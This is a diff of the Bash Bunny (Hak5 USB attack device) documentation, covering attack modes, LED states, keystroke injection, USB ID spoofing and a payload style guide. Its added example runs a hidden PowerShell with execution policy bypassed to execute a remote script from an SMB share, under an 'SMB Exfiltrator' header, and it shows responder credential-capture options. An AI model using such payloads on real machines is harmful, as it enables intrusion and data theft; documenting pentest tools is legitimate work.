@@ -21,7 +21,7 @@ The _Bunny Helpers_ can be sourced which extend the bunny scripting language wit
 | Q          | Alias for QUACK                                                       |
 | DUCKY_LANG | Set the HID Kayboard language. *e.g: DUCKY_LANG us*                   |
 
-### Extensions
+## Extensions
 
 Extensions which augment the bunny scripting language with new commands and functions. For each payload.txt run, extensions are sourced automatically. Calling the function names of any extension will produce the desired result. Extensions reside in the payload library on the USB mass storage partition from /payloads/library/extensions.
 
@@ -41,12 +41,12 @@ This table is provides a non-exhaustive list of basic usage for some extensions.
 | REQUIRETOOL      | Exits payload with LED FAIL state if the specified tool is not found in /tools | REQUIRETOOL impacket         |
 | DUCKY_LANG       | Accepts two letter country code to set the HID injection language for subsequent ducky script / QUACK commands | DUCKY_LANG us |
 
-**NOTE**: Extensions replaced bunny_helpers.sh from [Bash Bunny firmware version 1.1}(https://www.bashbunny.com/downloads/) onwards.
+**NOTE**: Extensions replaced bunny_helpers.sh from [Bash Bunny firmware version 1.1](https://www.bashbunny.com/downloads/) onwards.
 
 
 
 
-### ATTACKMODE
+## ATTACKMODE
 
 ATTACKMODE is a bunny script command which specifies which devices to emulate. The ATTACKMODE command may be issued multiple times within a given payload. For example, a payload may begin by emulating Ethernet, then switch to emulating a keyboard and serial later based on a number of conditions. 
 
@@ -79,11 +79,11 @@ Many combinations of attack modes are possible, however some are not. For exmapl
 | STORAGE RNDIS_ETHERNET        | 0xF000/0xFF20 |
 | STORAGE ECM_ETHERNET          | 0xF000/0xFF21 |
 
-### LED
+## LED
 
 The multi-color RGB LED status indicator on the Bash Bunny may be set using the LED command. It accepts either a combination of color and pattern, or a common payload state. 
 
-#### LED Colors
+### LED Colors
 
 | COMMAND | Description                    | 
 | ------- | ------------------------------ |
@@ -95,7 +95,7 @@ The multi-color RGB LED status indicator on the Bash Bunny may be set using the 
 | M       | Magenta (AKA Violet or Purple) |
 | W       | White                          |
 
-#### LED Patterns
+### LED Patterns
 
 | PATTERN    | Description                                              |
 | ---------- | -------------------------------------------------------- |
@@ -116,7 +116,7 @@ The multi-color RGB LED status indicator on the Bash Bunny may be set using the 
 | SUCCESS    | 1000ms VERYFAST blink followed by SOLID                  |
 | 1-10000    | Custom value in ms for continuous symmetric blinking     |
 
-#### LED State
+### LED State
 
 These standardized LED States may be used to indicate common payload status. The basic LED states include **SETUP**, **FAIL**, **ATTACK**, **CLEANUP** and **FINISH**. Payload developers are encouraged to use these common payload states. Additional states including multi-staged attack patterns are shown in the table below.
 
@@ -142,7 +142,7 @@ These standardized LED States may be used to indicate common payload status. The
 | CLEANUP  | W FAST        | White fast blink                              |
 | FINISH   | G SUCCESS     | Green 1000ms VERYFAST blink followed by SOLID |
 
-#### Examples
+### Examples
 
 ```
 LED Y SINGLE
@@ -155,7 +155,7 @@ LED SETUP
 ```
 
 
-### QUACK
+## QUACK
 
 The Bash Bunny is compatible with Ducky Script text files from its sister Hak5 project, the USB Rubber Ducky. These text files do not need to be encoded into inject.bin files first. Keystrokes can be injected from ducky script text files or inline using the QUACK command. The ATTACKMODE must contain HID for keystroke injection.
 
@@ -178,7 +178,7 @@ Q ALT F4
 ```
 Injects the keystroke combination of ALT and F4
 
-### VID and PID
+## VID and PID
 
 USB devices identify themselves by combinations of vendor ID and product ID. These 16-bit IDs are specified in hex and are used by the victim PC to find drivers (if necessary) for the specified device. With the Bash Bunny, the VID and PID may be spoofed using the VID and PID parameters for ATTACKMODE.
 
@@ -187,42 +187,57 @@ USB devices identify themselves by combinations of vendor ID and product ID. The
 ATTACKMODE HID STORAGE VID_0XF000 PID_0X1234
 ~~~~
 
-## Payload Best Practices
+## Payload Best Practices / Style Guide
 
-* Payloads should begin with comments specifing the name of the payloads, a description, the author, any special requirements/dependencies and the LED status.
+* Payloads should begin with comments specifing the name of the payload, a description, the author(s), any special requirements/dependencies, target, category, attackmodes and the LED status.
+
 ~~~~
-# Title:         Quick Creds
-# Author:        Hak5Darren -- Cred: Mubix
-# Version:       1.0
-#
-# Runs responder against target with specified options
-# Saves sequential logs to mass storage loot folder
-#
-# Requires responder in /pentest/responder - run tools_installer payload first
-#
-# White Blinking.....Dependencies not met. Responder not installed in /pentest
-# Red ...............Setup
-# Red Blinking.......Setup Failed. Target did not obtain IP address. Exit.
-# Amber Blinking.....Scanning
-# Green..............Finished
+# Title:         Faster SMB Exfiltrator
+# Description:   Exfiltrates files from users documents folder to Bash Bunny via SMB
+# Author:        Hak5Darren
+# Props:         ImNatho, mike111b, madbuda
+# Version:       1.1
+# Category:      Exfiltration
+# Target:        Windows XP SP3+ (Powershell)
+# Attackmodes:   HID, Ethernet
 ~~~~
+
 * Configurable options should be specified in variables at the top of the payload.txt file
 ~~~~
 # Options
 RESPONDER_OPTIONS="-w -r -d -P"
 LOOTDIR=/root/udisk/loot/quickcreds
 ~~~~
-* At various phases of the payload, the LED should be set to different colors/blink combinations. 
-* A beginning LED color should be specified _before_ initializing the first ATTACKMODE. 
-* This first color should not be green as a green blink is used at boot. 
-* If the payload is to write files to the loot folder on the USB mass storage partition, ending the payload with a quick file sync and green LED is optimal.
-~~~~
-sync
-LED G
-~~~~
-* As with any program, commenting code sections helps others better understand and enhance the payload.
+
+* LED should use common payload states rather than unique color/pattern combinations when possible.
+* The LED command should preceed the ATTACKMODE command for various stages
+* Stages should be documented with comments
+~~~
+######## HID STAGE ########
+# Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available
+GET HOST_IP
+LED STAGE1
+ATTACKMODE HID
+RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection $HOST_IP -count 1) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
+~~~
+
+* Common payload states include a **SETUP**, with may include a **FAIL** if certain conditions are not met. 
+* This is typically followed by either a single **ATTACK** or multiple **STAGE**s.
+* More complex payloads may include a **SPECIAL** function to wait until certain conditions are met.
+* Payloads commonly end with a **CLEANUP** phase, such as moving and deleting files or stopping services.
+* When the payload has **FINISH**ed, the Bash Bunny is safe to eject.
+* These common payload states correspond to LED states.
+
+
+## Working with the file system
+
+The Bash Bunny contains a USB Mass Storage parition (also known as udisk) which is typically accessed via Arming Mode. This is the Bash Bunny flash drive to which payloads are copied.
+
+When the Bash Bunny framework executes a payload, it will synchronize the USB Mass Storage partition file system once the payload completes. This can be either by an exit statement in the payload.txt, or when the Bunny Script reaches the end of file.
+
+Keep this in mind as a payload which writes files to the USB Mass Storage partition within a loop will not have the opportunity to synchronize until the payload completes. This is why ending payloads with an LED FINISH command is advised. In this case, the payload developer is advised to use the sync command to ensure file synchronization is completed.
 
 ## Submitting Payloads
 
-Payloads may be submitted to the [Bash Bunny Payload git repository](https://github.com/hak5/bashbunny-payloads "Bash Bunny Payload git repository")
+Payloads may be submitted to the [Bash Bunny Payload git repository](https://github.com/hak5/bashbunny-payloads "Bash Bunny Payload git repository"). For a video tutorial on submitting payloads, see [Hak5 episode 2126](https://www.hak5.org/episodes/season-21/hak5-2126-how-to-write-bash-bunny-payloads-contribute-on-github).
 
